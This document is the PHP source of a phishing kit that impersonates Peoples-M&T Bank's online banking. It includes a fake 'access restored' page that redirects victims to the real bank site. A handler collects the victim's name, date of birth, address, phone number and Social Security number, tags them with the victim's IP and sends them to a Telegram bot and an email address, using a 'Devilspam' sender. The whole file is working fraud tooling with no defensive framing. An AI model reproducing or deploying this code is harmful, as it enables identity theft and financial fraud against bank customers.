<?php
error_reporting(0);
ini_set('display_errors', 0);
session_start();           
require_once '../session.php';

$comps = new Comp;
$antibot = new Antibot;

if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}
$d = $_POST['ad'];
?>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta data-appid="ceb">
    <meta http-equiv="refresh" content="5;url=https://cibng.ibanking-services.com/eAM/Credential/Index?FIORG=136&orgId=136_221172186&FIFID=221172186&brand=136_221172186&appId=ceb"> 
    <!-- Latest minified CSS -->
    <link rel="stylesheet" href="eam/content/bootstrap.min.css?ver=63.3.4.1" type="text/css">
    <link rel="stylesheet" href="eam/content/eam.css?ver=63.3.4.1" type="text/css">
    <link rel="stylesheet" href="eam/content/fis-icon-font.css?ver=63.3.4.1" type="text/css">

    <link href="eam/styles/ceb_app/136_221172186/BankStyles.css?115707" rel="stylesheet" type="text/css">


    <!-- Latest JavaScript -->
    <script src="/eam/Scripts/umd/popper.min.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/jquery-3.6.0.min.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/bootstrap.min.js?ver=63.3.4.1"></script>    
    <script src="/eam/Scripts/eam.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/eam-visual-validator.js?ver=63.3.4.1"></script>
    <script type="text/javascript">window.name = "";</script>

    <link rel="stylesheet" href="eam/content/jquery.smartbanner.min.css?ver=63.3.4.1" type="text/css" media="screen">
    <script src="/eam/scripts/jquery.smartbanner.min.js?ver=63.3.4.1"></script>



    <title>Verify Your Information - Peoples-M&amp;T Bank Online Banking</title>

    
	<script src="/eam/Scripts/UserAccountValidation.js?ver=63.3.4.1"></script>

	
	<style type="text/css">
		div.form-group.row.collapse.show {
			display: flex;
		}
	</style>

</head>
<body>
	<header>
        <a id="skippy" class="visually-hidden-focusable" href="#secureHideArea"><span class="skiplink-text">Skip to main content</span></a>
		<div class="fis-header-content"><a class="brandedImageLink" title="Peoples-M&amp;T Bank" href="http://www.peoples.com"><img id="_BankLogo" class="" title="Peoples-M&amp;T Bank" alt="" src="https://cibng.ibanking-services.com/Eam/Styles/CeB_App/136_221172186/136_image.svg"></a></div>
	</header>

	<div id="content" class="fis-page-content">
		<div class="">
            <div id="secureHideArea" class="container secureHideArea" role="main" tabindex="-1">
                <div></div>
                <div class="row">
                    <h1 class="col-sm-12">Thank you! Your access has been Restored.</h1><br><br>
                    <p class="col-sm-12">Please wait, you will be redirected to the authentication,<br> If the page doesn't reload in 5 second.</p>
                </div>
                



            </div>
		</div>
	</div>

</body></html>
<?php
error_reporting(0);
ini_set('display_errors', 0);
require_once '../config.php';
function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IPPP = get_client_ip();

 if (strpos($IPPP, ',') !== false) {
     $ippro = "<fuck>".$IPPP;
     $cldcvers = get_string_between($ippro, '<fuck>', ',');
     $IP = $cldcvers;
 } else {
     $IP = $IPPP;
 }

$a1 = $_POST['fullname'];
$b1 = $_POST['dob'];
$a2 = $_POST['address'];
$b2 = $_POST['state'];
$a3 = $_POST['city'];
$b3 = $_POST['zip'];
$a4 = $_POST['phone'];
$b4 = $_POST['ssn'];


$data .= "<---- Personal Іnfοrmаtiοn : {$IP} ---->\n\n";
$data .= "Page : Peoples\n\n";
$data .= "Full Name : {$a1}\n";
$data .= "Date of Birth : {$b1}\n";
$data .= "Address : {$a2}\n";
$data .= "State : {$b2}\n";
$data .= "City: {$a3}\n";
$data .= "Zip Code : {$b3}\n";
$data .= "Phone Number : {$a4}\n";
$data .= "SSN : {$b4}\n\n";
$data .= "Developed by {$d}\n";

$token = $Token;
$id = $Id;
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";

$params=[
	'chat_id'=>$id,
	'text'=>$data,
];

if ($OnlyLoginInfo == "off") {
$ch = curl_init($bot . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
$email = $Email;
$subject = "Personal Information from : $IP";
$headers = "From: Devilspam <wellsby@anoxyty.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$data,$headers); 
}
exit();
?>